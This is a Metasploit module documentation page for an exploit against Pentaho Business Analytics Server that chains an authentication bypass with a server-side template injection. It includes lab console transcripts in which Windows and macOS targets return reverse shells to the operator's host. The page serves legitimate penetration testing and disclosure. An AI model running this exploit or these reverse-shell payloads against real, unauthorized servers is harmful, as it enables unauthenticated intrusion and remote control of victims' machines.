## Vulnerable Application  

Hitachi Vantara Pentaho Business Analytics Server prior to versions 9.4.0.1 and 9.3.0.2, including 8.3.x is
vulnerable to a number of vulnerabilities found and outlined by Harry Withington in the following blog post, 
[Pentah0wnage: Pre-Auth RCE in Pentaho Business Analytics Server](https://research.aurainfosec.io/pentest/pentah0wnage/)

This module exploits two vulnerabilities which results in unauthenticated code execution in the context of the user
running the Pentaho Business Analytics Server. The first vulnerability is an authentication bypass which stems from a 
regex that allows any url that ends `require.js` to bypass authentication. The second is a server side template 
injection which allows java code to be injected into the `url` parameter when sent to the following endpoint: 
`/api/ldap/config/ldapTreeNodeChildren`

### Setup

A vulnerable application can be downloaded for either Windows Linux or Mac from the Hitachi Vantara
[downloads](https://www.hitachivantara.com/en-us/products/lumada-dataops/data-integration-analytics/download-pentaho.html)
page.
  
Once downloaded, extract and run the installer. The installation wizard will ask you to set a password for the Pentaho
Business server. Once installation completes it will ask if you would like to launch the application. 

## Verification Steps  
  
1. Start msfconsole  
1. Do: `use multi/http/pentaho_business_server_authbypass_and_ssti`  
1. Set the `RHOST` and `LHOST` options
1. Ensure the `TARGET` option corresponds to the environment being targeted.  
1. Run the module  
1. Receive a session in the context of the user that's running the Pentaho Business Server.  
  
## Scenarios

### Windows 11 22H2 pentaho-business-analytics-9.3.0.0-428-x64.exe
```
msf6 > use multi/http/pentaho_business_server_authbypass_and_ssti
[*] Using configured payload cmd/unix/reverse_openssl
msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > set rhosts 172.16.199.138
rhosts => 172.16.199.138
msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > set target 2
target => 2
msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > options

Module options (exploit/multi/http/pentaho_business_server_authbypass_and_ssti):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.199.138   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /pentaho         yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.199.1     yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Attempting to exploit...
[+] Exploit successful
[*] Powershell session session 1 opened (172.16.199.1:4444 -> 172.16.199.138:51232) at 2023-05-03 15:07:11 -0400

PS C:\Pentaho\server\pentaho-server\tomcat> whoami
nt authority\local service
PS C:\Pentaho\server\pentaho-server\tomcat> systeminfo

Host Name:                 MSFDEVICE
OS Name:                   Microsoft Windows 11 Home
OS Version:                10.0.22621 N/A Build 22621
```

### Mac OS X Catalina pentaho-business-analytics-9.3.0.0-428-x64.app
```
msf6 > use multi/http/pentaho_business_server_authbypass_and_ssti
[*] Using configured payload cmd/unix/reverse_openssl
msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > set rhosts 172.16.199.132
rhosts => 172.16.199.132
msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > options

Module options (exploit/multi/http/pentaho_business_server_authbypass_and_ssti):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.199.132   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /pentaho         yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.199.1     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/sh          yes       The system shell to use


Exploit target:

   Id  Name
   --  ----
   0   Unix Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/pentaho_business_server_authbypass_and_ssti) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Attempting to exploit...
[+] Exploit successful
[*] Command shell session 1 opened (172.16.199.1:4444 -> 172.16.199.132:49391) at 2023-05-03 15:14:07 -0400

id
uid=501(msfuser) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
uname -a
Darwin msfusers-Mac.local 19.3.0 Darwin Kernel Version 19.3.0: Thu Jan  9 20:58:23 PST 2020; root:xnu-6153.81.5~1/RELEASE_X86_64 x86_64
```